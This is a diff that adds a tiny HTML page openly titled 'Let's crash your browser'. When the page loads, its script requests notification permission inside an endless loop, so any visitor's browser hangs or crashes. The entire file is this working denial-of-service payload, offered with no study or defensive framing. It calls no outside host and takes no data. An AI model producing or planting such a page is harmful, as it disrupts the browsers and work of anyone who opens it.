@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en-US">
+ 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Let's crash your browser</title>
+    <script>
+let permission = Notification.permission;
+requestAndShowPermission();
+
+function requestAndShowPermission() {
+   while (true){
+       Notification.requestPermission(function (permission) {
+    console.log(permission);
+   });
+}}
+    </script>
+</head>
+ 
+<body>
+ 
+</body>
+ 
+ 
+ 
+</html>
